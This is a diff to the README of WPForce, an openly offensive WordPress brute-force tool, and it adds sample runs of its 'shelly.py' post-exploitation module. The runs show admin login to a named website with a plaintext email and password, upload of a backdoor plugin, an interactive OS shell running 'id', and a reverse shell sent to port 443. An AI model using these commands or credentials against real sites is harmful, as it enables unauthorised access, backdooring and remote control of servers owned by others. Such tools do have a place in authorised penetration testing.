@@ -1,7 +1,7 @@
 # WPForce
 ```
 Wordpress Brute Force Attack Tool
-Last Updated: 2016-03-26
+Last Updated: 2016-04-19
 
 ABOUT: 
 This tool uses the Wordpress API to brute force login credentials.
@@ -29,6 +29,51 @@ URL: http://www[website].com
  100% Percent Complete
 All correct pairs:
 {'xxxxxxxxxxxxx@icloud.com': 'xxxxxxxxxxxxx', 'xxxxxxxxxxxxx@gmail.com': 'xxxxxxxxxxxxx'}
+```
+```
+python shelly.py -t "http://www.snarlsburg.com" -u "esteban.m.rodriguez@gmail.com" -p "Y85@j0l4cFP@254c" -i
+       ,-~~-.___.       __        __ ____   _____
+      / |  x     \      \ \      / /|  _ \ |  ___|___   _ __  ___  ___
+     (  )        0       \ \ /\ / / | |_) || |_  / _ \ | '__|/ __|/ _ \.
+      \_/-, ,----'  ____  \ V  V /  |  __/ |  _|| (_) || |  | (__|  __/
+         ====      ||   \_ \_/\_/   |_|    |_|   \___/ |_|   \___|\___|
+        /  \-'~;   ||     |
+       /  __/~| ...||__/|-"   Post-exploitation Module for Wordpress
+     =(  _____||________|                 ~n00py~
+    
+Server Header: Apache/2
+Probably a Linux server
+Found Login Page
+Logged in as Admin
+Found CSRF Token: 679f202158
+Backdoor uploaded!
+Plugin installed successfully
+Upload Directory: xhtnhgo
+os-shell> id
+Sending command: id
+uid=4812176(dom.snarlsburgcom) gid=15010(cgiuser) groups=15020,15010(cgiuser)
 
+os-shell> 
+```
+```
+python shelly.py -t "http://www.snarlsburg.com" -u "esteban.m.rodriguez@gmail.com" -p "Y85@j0l4cFP@254c" -lp 443 -li 10.0.0.0 -r
+       ,-~~-.___.       __        __ ____   _____
+      / |  x     \      \ \      / /|  _ \ |  ___|___   _ __  ___  ___
+     (  )        0       \ \ /\ / / | |_) || |_  / _ \ | '__|/ __|/ _ \.
+      \_/-, ,----'  ____  \ V  V /  |  __/ |  _|| (_) || |  | (__|  __/
+         ====      ||   \_ \_/\_/   |_|    |_|   \___/ |_|   \___|\___|
+        /  \-'~;   ||     |
+       /  __/~| ...||__/|-"   Post-exploitation Module for Wordpress
+     =(  _____||________|                 ~n00py~
+    
+Server Header: Apache/2
+Probably a Linux server
+Found Login Page
+Logged in as Admin
+Found CSRF Token: dcdc5108de
+Backdoor uploaded!
+Plugin installed successfully
+Upload Directory: ugxdirx
+Sending reverse shell to 10.0.0.0 port 443
  
 ```
